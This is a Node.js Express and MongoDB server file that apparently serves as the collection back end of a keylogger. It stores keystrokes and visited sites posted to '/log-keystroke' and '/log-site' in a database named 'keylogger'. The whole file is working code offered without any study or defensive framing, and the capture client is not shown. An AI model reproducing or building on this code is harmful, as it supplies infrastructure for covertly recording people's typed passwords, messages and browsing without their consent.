const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json());

// Connect to MongoDB.
mongoose.connect('mongodb://localhost:27017/keylogger', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

// Define schemas and models for keystrokes and sites.
const keystrokeSchema = new mongoose.Schema({
  keystroke: String,
  timestamp: { type: Date, default: Date.now }
});

const siteSchema = new mongoose.Schema({
  site: String,
  timestamp: { type: Date, default: Date.now }
});

const Keystroke = mongoose.model('Keystroke', keystrokeSchema);
const Site = mongoose.model('Site', siteSchema);

// Define routes to handle logging keystrokes and sites.
app.post('/log-keystroke', (req, res) => {
  const { keystroke } = req.body;
  const newKeystroke = new Keystroke({ keystroke });
  newKeystroke.save()
    .then(() => res.sendStatus(200))
    .catch(err => {
      console.error('Error logging keystroke:', err);
      res.sendStatus(500);
    });
});

app.post('/log-site', (req, res) => {
  const { site } = req.body;
  const newSite = new Site({ site });
  newSite.save()
    .then(() => res.sendStatus(200))
    .catch(err => {
      console.error('Error logging site:', err);
      res.sendStatus(500);
    });
});

// Start the server.
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}.`);
});
